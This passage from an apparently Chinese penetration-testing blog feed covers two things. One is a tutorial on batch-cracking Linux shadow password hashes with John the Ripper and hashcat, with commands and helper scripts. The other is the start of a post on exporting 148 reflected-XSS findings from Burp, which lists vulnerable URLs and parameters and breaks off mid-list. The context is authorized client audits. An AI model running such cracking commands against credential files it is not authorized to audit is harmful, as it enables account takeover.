        <content type="html"><![CDATA[<p>一般在对客户所有linux机器进行弱口令检查时，如果在线进行破解的话，先不说影响业务，破解速率很慢，而且必须保证可以破解期间保持访问。这时将在线破解变成让客户提供shadow，我们破解shadow就有优势多了。后来k哥提供了一个批量调用john the ripper破解shadow的bash脚本。但是有诸多局限性，故深入研究优化了一下，并已此文做个记录。如各位有更优秀的解决方案，欢迎交流！</p><h2 id="0x01思路"><a href="#0x01思路" class="headerlink" title="0x01思路"></a>0x01思路</h2><p>公司大神写的脚本</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/sh</span><br><span class="line">for i in `ls ./shadow/`;</span><br><span class="line">do</span><br><span class="line">echo &quot;---------------$i---------------&quot;</span><br><span class="line">john --single ./shadow/$i;</span><br><span class="line">john --wordlist=10W.txt ./shadow/$i;</span><br><span class="line">john --format=crypt --wordlist=10W.txt ./shadow/$i;</span><br><span class="line">john --format=sha512crypt --wordlist=10W.txt ./shadow/$i;</span><br><span class="line">john --show ./shadow/$i &gt; /tmp/$i.result;</span><br><span class="line">done;</span><br></pre></td></tr></table></figure><p>通过了解脚本的源码，发现存在一下局限性：</p><ul><li>速度慢，耗时间</li><li>不精准</li><li>无法查看破解进度</li><li>如果暂停破解，后面不好恢复到当前破解进度</li></ul><p>针对上局限性，我思考了一下解决方法：</p><ul><li>通过去掉空密码账号，减少时间消耗</li><li>对shadow中的hash类型进行识别，实现精准破解</li><li>将多个shadow合成一个shadow，这样就可以查看进度，同时需要暂停的话，后面好恢复任务。</li></ul><p>用图1对以上方法做了一个流程化的梳理</p><p><img src="/articles/2017/batch-crack-shadows/pic.png" alt="图1-解决方案流程图"></p><h2 id="0x01shadow格式简介"><a href="#0x01shadow格式简介" class="headerlink" title="0x01shadow格式简介"></a>0x01shadow格式简介</h2><p>在破解之前我们先了解一下shadow格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">root:$1$v2wT9rQF$XSpGgoB93STC4EFSlgpjg1:14181:0:99999:7:::</span><br></pre></td></tr></table></figure><p>可以发现shadow中每一行对应这一个用户的用户名和密码等信息，格式为<code>0:1:2:3:4:5:6:7:8</code></p><p>冒号是分割符，分别代表着，每个字段分别代表着：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:用户名</span><br><span class="line">1:密码hash值</span><br><span class="line">2:密码修改距离1970年1月1日的时间</span><br><span class="line">3:密码将被允许修改之前的天数（0 表示“可在任何时间修改”）</span><br><span class="line">4:系统将强制用户修改为新密码之前的天数（1 表示“永远都不能修改”）</span><br><span class="line">5:密码过期之前，用户将被警告过期的天数（-1 表示“没有警告”）</span><br><span class="line">6:密码过期之后，系统自动禁用帐户的天数（-1 表示“永远不会禁用”）</span><br><span class="line">7:该帐户被禁用的天数（-1 表示“该帐户被启用”）</span><br><span class="line">8:保留供将来使用</span><br></pre></td></tr></table></figure><p>hash值一览格式如：<code>$id$salt$密文</code></p><p>id代表的是使用不同的加密算法，不同的系统使用的算法也不尽相同。salt是加密的时候需要用到盐。最后就是密文。</p><p>数字和所使用的加密算法对应关系：</p><table><thead><tr><th align="center">格式</th><th align="center">算法</th></tr></thead><tbody><tr><td align="center">$1</td><td align="center">md5</td></tr><tr><td align="center">$2a</td><td align="center">blowfish</td></tr><tr><td align="center">$2y</td><td align="center">blowfish</td></tr><tr><td align="center">$5</td><td align="center">sha-256</td></tr><tr><td align="center">$6</td><td align="center">sha-512</td></tr></tbody></table><p>注意：如果密码字符串为<code>*</code>，表示系统用户不能被登入，为<code>!</code>表示用户名被禁用，如果密码字符串为空，表示没有密码。</p><h2 id="0x02整理shadow"><a href="#0x02整理shadow" class="headerlink" title="0x02整理shadow"></a>0x02整理shadow</h2><p>为了提高破解的效率，提高精确度，我们将从多个shadow文件中提取出满足以下条件的用户，并合成一个shadow文件：</p><ul><li>去除空密码账号</li><li>每个账号的密码加密方式不一样，破解时要选择对应的算法，所以将密码进行分类。</li><li>筛选处我们要破解的用户</li></ul><p>为此特地写了一个脚本<code>shadowFilter.py</code>，来快速批量处理shadow文件（如果想了解该脚本的各个参数作用，请看我的github）。</p><p>脚本地址：</p><p><code>https://github.com/c0ny1/WorkScripts/blob/master/crack-shadow-helper/ShadowFilter.py</code></p><p>比如：我们需要破解shadow目录下的所有shadow文件中，root和test的账号的密码，可以进行如下整理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">python shadowFilter.py -d F:\shadow\ -c 1 -iuser root -o hashcat_crack.shadow #输出适合hashcat破解的格式</span><br><span class="line">python shadowFilter.py -d F:\shadow\ -iuser root -o john_crack.shadow #输出适合john the ripper破解的格式</span><br></pre></td></tr></table></figure><p>注意：-c代表的是需要哪一列，shadow的格式是<code>0:1:2:3:4:5:6:7:8</code>,0列是用户，1列是密码等等。hashcat破解是只需要1列，john需要全部列！</p><h2 id="0x03使用hashid识别hash类型"><a href="#0x03使用hashid识别hash类型" class="headerlink" title="0x03使用hashid识别hash类型"></a>0x03使用hashid识别hash类型</h2><p>hashid.py是一个可以识别多种hash类的脚本，同时它可以输出hashcat和john the ripper破解该类型的格式。参数如下：</p><table><thead><tr><th align="center">参数</th><th>描述</th></tr></thead><tbody><tr><td align="center">INPUT</td><td>输入的HASH（默认值：STDIN）</td></tr><tr><td align="center">-e, –extended</td><td>列出所有包括咸密码散列算法</td></tr><tr><td align="center">-m, –mode</td><td>显示相应hashcat模式输出</td></tr><tr><td align="center">-j, –john</td><td>显示相应JohnTheRipper格式输出</td></tr><tr><td align="center">-o FILE, –outfile FILE</td><td>写输出文件(默认值:STDOUT)</td></tr><tr><td align="center">–help</td><td>显示帮助信息</td></tr><tr><td align="center">–version</td><td>显示程序的版本号</td></tr></tbody></table><p>识别crack.shadow中所有hash的类型，并输出相应hashcat和john the ripper破解格式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashid -m -j crack.shadow</span><br></pre></td></tr></table></figure><h2 id="0x04使用工具进行破解"><a href="#0x04使用工具进行破解" class="headerlink" title="0x04使用工具进行破解"></a>0x04使用工具进行破解</h2><h4 id="1-使用hashcat破解"><a href="#1-使用hashcat破解" class="headerlink" title="(1)使用hashcat破解"></a>(1)使用hashcat破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -a 0 -m 500 out.shadow 10W.txt #500为hashcat识别出</span><br><span class="line">hashcat64.exe --show out.shadow &gt; pwd.txt #查看结果</span><br></pre></td></tr></table></figure><h4 id="2-使用john-the-ripper破解"><a href="#2-使用john-the-ripper破解" class="headerlink" title="(2)使用john the ripper破解"></a>(2)使用john the ripper破解</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john --single out.shadow</span><br><span class="line">john --format=md5crypt --wordlist=10W.txt out.shadow #md5crypt为hashid识别出</span><br><span class="line">john --show out.shadow &gt;pwd.txt #查看结果</span><br></pre></td></tr></table></figure><p>这个两个工具在破解hash方面都是神器，支持大部分的hash类型破解。如果你有linux服务器，推荐使用john the ripper挂在上面日夜跑着。如果你在windows上，同时对速度有要求的话，推荐使用hashcat,并使用GPU破解来加快数据，还嫌不够快的童鞋可以研究hashcat分布式破解了！</p><h2 id="0x05整理结果"><a href="#0x05整理结果" class="headerlink" title="0x05整理结果"></a>0x05整理结果</h2><p>在破解完成后，我们需要将破解好的密码关联到某主机的某个账号。同样使用脚本批量处理：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/c0ny1/WorkScripts/blob/master/crack-shadow-helper/SearchPwdFromShadow.py</span><br></pre></td></tr></table></figure><h5 id="python-SearchPwdFromShadow-py-d-F-shadow-p-pwd-txt-o-result-txt"><a href="#python-SearchPwdFromShadow-py-d-F-shadow-p-pwd-txt-o-result-txt" class="headerlink" title="python SearchPwdFromShadow.py -d F:\shadow\ -p pwd.txt -o result.txt"></a>python SearchPwdFromShadow.py -d F:\shadow\ -p pwd.txt -o result.txt</h5>]]></content>
      
      
      <categories>
          
          <category> 渗透测试 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hash破解 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>148处XSS你如何提交给开发修复？</title>
      <link href="/articles/2017/how-do-to-submit-148-xss-vulnerabilities/"/>
      <url>/articles/2017/how-do-to-submit-148-xss-vulnerabilities/</url>
      
        <content type="html"><![CDATA[<h5 id="客户：你上周发的渗透测试报告中说存在有148处XSS。今天开发需要修复，但你的渗透测试报告只列举了三处。开发需要提供所有存在漏洞的地址，才能修复完整。"><a href="#客户：你上周发的渗透测试报告中说存在有148处XSS。今天开发需要修复，但你的渗透测试报告只列举了三处。开发需要提供所有存在漏洞的地址，才能修复完整。" class="headerlink" title="客户：你上周发的渗透测试报告中说存在有148处XSS。今天开发需要修复，但你的渗透测试报告只列举了三处。开发需要提供所有存在漏洞的地址，才能修复完整。"></a>客户：你上周发的渗透测试报告中说存在有148处XSS。今天开发需要修复，但你的渗透测试报告只列举了三处。开发需要提供所有存在漏洞的地址，才能修复完整。</h5><h5 id="我：其实可以在系统数据提交的入口，对get和post数据包中参数进行过滤就好了。那样就修改一处就可以了。"><a href="#我：其实可以在系统数据提交的入口，对get和post数据包中参数进行过滤就好了。那样就修改一处就可以了。" class="headerlink" title="我：其实可以在系统数据提交的入口，对get和post数据包中参数进行过滤就好了。那样就修改一处就可以了。"></a>我：其实可以在系统数据提交的入口，对get和post数据包中参数进行过滤就好了。那样就修改一处就可以了。</h5><h5 id="客户：你跟开发说吧！"><a href="#客户：你跟开发说吧！" class="headerlink" title="客户：你跟开发说吧！"></a>客户：你跟开发说吧！</h5><h5 id="开发：如果在入口处统一对所有数据包进行过滤，可能会导致某些功能无法使用。所以只能一处处改。"><a href="#开发：如果在入口处统一对所有数据包进行过滤，可能会导致某些功能无法使用。所以只能一处处改。" class="headerlink" title="开发：如果在入口处统一对所有数据包进行过滤，可能会导致某些功能无法使用。所以只能一处处改。"></a>开发：如果在入口处统一对所有数据包进行过滤，可能会导致某些功能无法使用。所以只能一处处改。</h5><h5 id="我：。。。。。。。"><a href="#我：。。。。。。。" class="headerlink" title="我：。。。。。。。"></a>我：。。。。。。。</h5><h5 id="我：我去看看能不能导出来。"><a href="#我：我去看看能不能导出来。" class="headerlink" title="我：我去看看能不能导出来。"></a>我：我去看看能不能导出来。</h5><h2 id="0x01导出XSS"><a href="#0x01导出XSS" class="headerlink" title="0x01导出XSS"></a>0x01导出XSS</h2><p>&emsp;&emsp;幸亏那次渗透之后保留了burp的state。我马上用bup加载了state文件。当时就在想。XSS有的是GET,有的POST,涉及参数重多。该如何导出。如果使用copy URLs，当然也行。但是开发估计也不知道那个参数是存在问题的。特别是psot包更难体现出，那个地方，那个参数存在XSS。</p><p>&emsp;&emsp;无奈先选择148处XSS，然后把它们先导出来。<br><img src="/articles/2017/how-do-to-submit-148-xss-vulnerabilities/save_report_issues.png" alt="图1-导出XSS报告"></p><p>耷拉着脑袋一看，眼睛就亮了。burp真是一次又一次刷新在我心中地位。我要的148处链接已密密麻麻出现在我的眼帘。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><span class="line">Contents</span><br><span class="line">1. Cross-site scripting (reflected)</span><br><span class="line"></span><br><span class="line">1.1. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [groupId parameter]</span><br><span class="line"></span><br><span class="line">1.2. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.3. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.4. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.5. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [qo.begDate parameter]</span><br><span class="line"></span><br><span class="line">1.6. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [qo.begDate_format parameter]</span><br><span class="line"></span><br><span class="line">1.7. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [qo.endDate parameter]</span><br><span class="line"></span><br><span class="line">1.8. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [qo.endDate_format parameter]</span><br><span class="line"></span><br><span class="line">1.9. http://x.x.x.x/csp/attendance/listLeaveBillByQo.action [qo.staffName parameter]</span><br><span class="line"></span><br><span class="line">1.10. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [InstancyOverTimeRequestInfo.endDate parameter]</span><br><span class="line"></span><br><span class="line">1.11. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [InstancyOverTimeRequestInfo.endDate_format parameter]</span><br><span class="line"></span><br><span class="line">1.12. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [InstancyOverTimeRequestInfo.startDate parameter]</span><br><span class="line"></span><br><span class="line">1.13. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [InstancyOverTimeRequestInfo.startDate_format parameter]</span><br><span class="line"></span><br><span class="line">1.14. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.15. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.16. http://x.x.x.x/csp/attendance/queryInstancyRequestManage.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.17. http://x.x.x.x/csp/attendance/showLeaveBill.action [billType parameter]</span><br><span class="line"></span><br><span class="line">1.18. http://x.x.x.x/csp/attendance/showLeaveBill.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.19. http://x.x.x.x/csp/cal.calendarjsp [buttonId parameter]</span><br><span class="line"></span><br><span class="line">1.20. http://x.x.x.x/csp/cal.calendarjsp [cssFilePath parameter]</span><br><span class="line"></span><br><span class="line">1.21. http://x.x.x.x/csp/cal.calendarjsp [cssstyle parameter]</span><br><span class="line"></span><br><span class="line">1.22. http://x.x.x.x/csp/cal.calendarjsp [currentValue parameter]</span><br><span class="line"></span><br><span class="line">1.23. http://x.x.x.x/csp/cal.calendarjsp [currentValue parameter]</span><br><span class="line"></span><br><span class="line">1.24. http://x.x.x.x/csp/cal.calendarjsp [daylightRepeatedMessage parameter]</span><br><span class="line"></span><br><span class="line">1.25. http://x.x.x.x/csp/cal.calendarjsp [daylightsupportrequiredMessage parameter]</span><br><span class="line"></span><br><span class="line">1.26. http://x.x.x.x/csp/cal.calendarjsp [displayformat parameter]</span><br><span class="line"></span><br><span class="line">1.27. http://x.x.x.x/csp/cal.calendarjsp [hiddenformat parameter]</span><br><span class="line"></span><br><span class="line">1.28. http://x.x.x.x/csp/cal.calendarjsp [inputfield parameter]</span><br><span class="line"></span><br><span class="line">1.29. http://x.x.x.x/csp/cal.calendarjsp [inputfield parameter]</span><br><span class="line"></span><br><span class="line">1.30. http://x.x.x.x/csp/cal.calendarjsp [jsPath parameter]</span><br><span class="line"></span><br><span class="line">1.31. http://x.x.x.x/csp/cal.calendarjsp [jsPath parameter]</span><br><span class="line"></span><br><span class="line">1.32. http://x.x.x.x/csp/cal.calendarjsp [nextyearrange parameter]</span><br><span class="line"></span><br><span class="line">1.33. http://x.x.x.x/csp/cal.calendarjsp [objectName parameter]</span><br><span class="line"></span><br><span class="line">1.34. http://x.x.x.x/csp/cal.calendarjsp [previousyearrange parameter]</span><br><span class="line"></span><br><span class="line">1.35. http://x.x.x.x/csp/cal.calendarjsp [resettime parameter]</span><br><span class="line"></span><br><span class="line">1.36. http://x.x.x.x/csp/cal.calendarjsp [timezone parameter]</span><br><span class="line"></span><br><span class="line">1.37. http://x.x.x.x/csp/cal.calendarjsp [type parameter]</span><br><span class="line"></span><br><span class="line">1.38. http://x.x.x.x/csp/cal.calendarjsp [windowtype parameter]</span><br><span class="line"></span><br><span class="line">1.39. http://x.x.x.x/csp/compensation/budgetDeptPage.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.40. http://x.x.x.x/csp/compensation/budgetDeptPage.action [timeStamp parameter]</span><br><span class="line"></span><br><span class="line">1.41. http://x.x.x.x/csp/compensation/budgetSalPage.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.42. http://x.x.x.x/csp/compensation/budgetSalPage.action [timeStamp parameter]</span><br><span class="line"></span><br><span class="line">1.43. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.44. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.45. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.46. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.47. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.48. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [personSalItem.employeeId parameter]</span><br><span class="line"></span><br><span class="line">1.49. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [personSalItem.salItemName parameter]</span><br><span class="line"></span><br><span class="line">1.50. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [personSalItem.staffName parameter]</span><br><span class="line"></span><br><span class="line">1.51. http://x.x.x.x/csp/compensation/findPersonSalItemByCond.action [personSalItem.staffNo parameter]</span><br><span class="line"></span><br><span class="line">1.52. http://x.x.x.x/csp/compensation/queryBudget.action [budgetYear parameter]</span><br><span class="line"></span><br><span class="line">1.53. http://x.x.x.x/csp/compensation/queryBudget.action [name of an arbitrarily supplied URL parameter]</span><br><span class="line"></span><br><span class="line">1.54. http://x.x.x.x/csp/compensation/queryBudget.action [name of an arbitrarily supplied body parameter]</span><br><span class="line"></span><br><span class="line">1.55. http://x.x.x.x/csp/compensation/queryBudget.action [order.ascending parameter]</span><br><span class="line"></span><br><span class="line">1.56. http://x.x.x.x/csp/compensation/queryBudget.action [page.currentPage parameter]</span><br><span class="line"></span><br><span class="line">1.57. http://x.x.x.x/csp/compensation/queryBudget.action [page.pageSize parameter]</span><br><span class="line"></span><br><span class="line">1.58. http://x.x.x.x/csp/manpower/addAddressInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.59. http://x.x.x.x/csp/manpower/addAddressInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.60. http://x.x.x.x/csp/manpower/addMemberInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.61. http://x.x.x.x/csp/manpower/addMemberInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.62. http://x.x.x.x/csp/manpower/baseInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.63. http://x.x.x.x/csp/manpower/baseInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.64. http://x.x.x.x/csp/manpower/baseInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.65. http://x.x.x.x/csp/manpower/esm_monitorTeamManager.action [monitorType parameter]</span><br><span class="line"></span><br><span class="line">1.66. http://x.x.x.x/csp/manpower/esm_monitorTeamManager.action [operType parameter]</span><br><span class="line"></span><br><span class="line">1.67. http://x.x.x.x/csp/manpower/extendInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.68. http://x.x.x.x/csp/manpower/extendInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.69. http://x.x.x.x/csp/manpower/extendInfoModifyPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.70. http://x.x.x.x/csp/manpower/getBaseInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.71. http://x.x.x.x/csp/manpower/getExtendInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.72. http://x.x.x.x/csp/manpower/listAddressInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.73. http://x.x.x.x/csp/manpower/listAddressInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.74. http://x.x.x.x/csp/manpower/listAddressInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.75. http://x.x.x.x/csp/manpower/listAddressInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.76. http://x.x.x.x/csp/manpower/listAddressInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.77. http://x.x.x.x/csp/manpower/listAddressInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.78. http://x.x.x.x/csp/manpower/listMemberInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.79. http://x.x.x.x/csp/manpower/listMemberInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.80. http://x.x.x.x/csp/manpower/listMemberInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.81. http://x.x.x.x/csp/manpower/listMemberInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.82. http://x.x.x.x/csp/manpower/listMemberInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.83. http://x.x.x.x/csp/manpower/listMemberInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.84. http://x.x.x.x/csp/manpower/listPartyInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.85. http://x.x.x.x/csp/manpower/listPartyInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.86. http://x.x.x.x/csp/manpower/listPartyInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.87. http://x.x.x.x/csp/manpower/listRelationInfo.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.88. http://x.x.x.x/csp/manpower/listRelationInfo.action [staffId parameter]</span><br><span class="line"></span><br><span class="line">1.89. http://x.x.x.x/csp/manpower/listRelationInfo.action [staffSN parameter]</span><br><span class="line"></span><br><span class="line">1.90. http://x.x.x.x/csp/manpower/updateAddressInfoPage.action [doWhat parameter]</span><br><span class="line"></span><br><span class="line">1.91. 